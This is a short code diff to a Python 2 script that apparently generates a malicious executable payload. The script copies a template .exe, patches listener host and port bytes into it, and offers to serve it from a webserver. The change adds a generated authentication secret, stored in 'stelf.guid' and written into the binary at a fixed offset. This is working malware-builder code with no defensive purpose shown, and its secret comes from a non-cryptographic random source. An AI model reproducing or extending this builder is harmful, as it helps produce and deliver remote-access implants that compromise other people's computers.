@@ -36,6 +36,11 @@ except OSError as exc:
         pass
     else:
         raise
+		
+if not os.path.isfile("stelf.guid"):
+	print_info("Generating secret for authentication, it will be stored in 'stelf.guid'")
+	with open("stelf.guid", "wb") as f:
+		f.write(hashlib.sha512(str(random.randrange(10**100, (10**101)-1))).hexdigest()[:30])
 
 shutil.copy2('./template/template.exe', './payload/'+output)
 
@@ -47,6 +52,11 @@ with open('./payload/'+output,"r+b") as f:
 		f.write(part)
 	for part in lport_bytes:
 		f.write(part)
+
+	with open("stelf.guid","rb") as a:
+		auth_key = a.read()
+		f.seek(930)
+		f.write(auth_key)
 
 print "Payload generated, would you like to start a webserver there?"
 ans = raw_input("y/n ").lower()
